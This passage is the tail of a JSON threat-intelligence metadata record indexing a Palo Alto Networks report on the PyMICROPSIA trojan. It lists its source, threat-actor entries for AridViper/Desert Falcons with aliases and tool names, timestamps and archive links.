examples.\n\n**Get updates from**\n\n**Palo Alto**\n\n**Networks!**\n\nSign up to receive the latest news, cyber threat intelligence and research from us\n\n[By submitting this form, you agree to our Terms of Use and acknowledge our Privacy](https://www.paloaltonetworks.com/legal-notices/terms-of-use)\nStatement.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-12-14 - PyMICROPSIA- New Information-Stealing Trojan from AridViper.pdf"
    ],
    "report_names": [
        "2020-12-14 - PyMICROPSIA- New Information-Stealing Trojan from AridViper.pdf"
    ],
    "threat_actors": [
        {
            "id": "f7d9b02d-d294-422b-adf7-4b3adfac9d9a",
            "created_at": "2022-10-25T16:07:23.392241Z",
            "updated_at": "2025-03-27T02:02:09.775925Z",
            "deleted_at": null,
            "main_name": "The Big Bang",
            "aliases": [],
            "source_name": "ETDA:The Big Bang",
            "tools": [
                "Micropsia"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "9198aefa-3da6-4605-bb52-923df20a7fce",
            "created_at": "2023-01-06T13:46:38.766848Z",
            "updated_at": "2025-03-27T02:00:02.913269Z",
            "deleted_at": null,
            "main_name": "The Big Bang",
            "aliases": [],
            "source_name": "MISPGALAXY:The Big Bang",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "9ff60d4d-153b-4ed5-a2f7-18a21d2fa05d",
            "created_at": "2022-10-25T16:07:23.539852Z",
            "updated_at": "2025-03-27T02:02:09.853285Z",
            "deleted_at": null,
            "main_name": "Desert Falcons",
            "aliases": [
                "APT-C-23",
                "ATK 66",
                "Arid Viper",
                "Operation Arid Viper",
                "Operation Bearded Barbie",
                "Operation Rebound",
                "TAG-63",
                "TAG-CT1",
                "Two-tailed Scorpion"
            ],
            "source_name": "ETDA:Desert Falcons",
            "tools": [
                "AridSpy",
                "Barb(ie) Downloader",
                "BarbWire",
                "Desert Scorpion",
                "FrozenCell",
                "GlanceLove",
                "GnatSpy",
                "KasperAgent",
                "Micropsia",
                "PyMICROPSIA",
                "SpyC23",
                "Viper RAT",
                "ViperRAT",
                "VolatileVenom",
                "WinkChat",
                "android.micropsia"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "929d794b-0e1d-4d10-93a6-29408a527cc2",
            "created_at": "2023-01-06T13:46:38.70844Z",
            "updated_at": "2025-03-27T02:00:02.897573Z",
            "deleted_at": null,
            "main_name": "AridViper",
            "aliases": [
                "Arid Viper",
                "APT-C-23",
                "Bearded Barbie",
                "Desert Falcon"
            ],
            "source_name": "MISPGALAXY:AridViper",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673535940,
    "ts_updated_at": 1743041683,
    "ts_creation_date": 1653786023,
    "ts_modification_date": 1653786023,
    "files": {
        "pdf": "https://archive.orkl.eu/188c717c64fcfd20a2e2d6d0e51f60abc0b2397e.pdf",
        "text": "https://archive.orkl.eu/188c717c64fcfd20a2e2d6d0e51f60abc0b2397e.txt",
        "img": "https://archive.orkl.eu/188c717c64fcfd20a2e2d6d0e51f60abc0b2397e.jpg"
    }
}